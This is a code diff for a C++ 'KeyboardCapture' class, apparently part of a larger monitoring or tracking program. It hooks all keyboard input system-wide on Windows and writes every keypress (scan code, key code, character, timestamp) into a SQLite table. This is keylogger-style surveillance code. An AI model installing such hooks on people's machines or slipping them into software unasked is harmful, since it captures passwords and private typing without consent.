@@ -16,20 +16,33 @@ KeyboardCapture::KeyboardCapture() {
     if(exists)
         throw instance_exists_error("Keyboard Capture");
     exists = true;
+    self = this;
     infoType = FlobGlobal::Keypress;
     sql_table = "CREATE TABLE IF NOT EXISTS keypress_type("
                 "id INTEGER PRIMARY KEY,"
                 "up INTEGER,"
                 "scancode INTEGER,"
                 "vkcode INTEGER,"
-                "char VARCHAR(4),"
-                "time INTEGER);";
+                "char TEXT,"
+                "time TEXT);";
 
     keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL,llkeyhook, NULL,0);
 }
 
 KeyboardCapture::~KeyboardCapture() {
     UnhookWindowsHookEx(keyboardHook);
+}
+
+void KeyboardCapture::sql_action(const Info* inf){
+    auto pack = (KeypressInfo*)inf;
+    FCS.safe->insert_data(L"INSERT INTO keypress_type(up, scancode, vkcode, char, time) VALUES (?,?,?,?,?)",
+                          {
+                            new sql_int(0),
+                            new sql_int(pack->scancode),
+                            new sql_int(pack->vkcode),
+                            new sql_str(pack->descr),
+                            new sql_str(pack->timestamp)
+                          });
 }
 
 LRESULT KeyboardCapture::llkeyhook(int nCode, WPARAM wParam, LPARAM lParam) {
@@ -60,6 +73,6 @@ LRESULT KeyboardCapture::llkeyhook(int nCode, WPARAM wParam, LPARAM lParam) {
     info.vkcode = (unsigned)further->vkCode;
     info.timestamp = time;
     wcsncpy(info.descr,map(info.vkcode).c_str(),(size_t)4);
-    FCS.safe->save(info);
+    self->sql_action(&info);
     return CallNextHookEx(keyboardHook,nCode,wParam,lParam);
 }
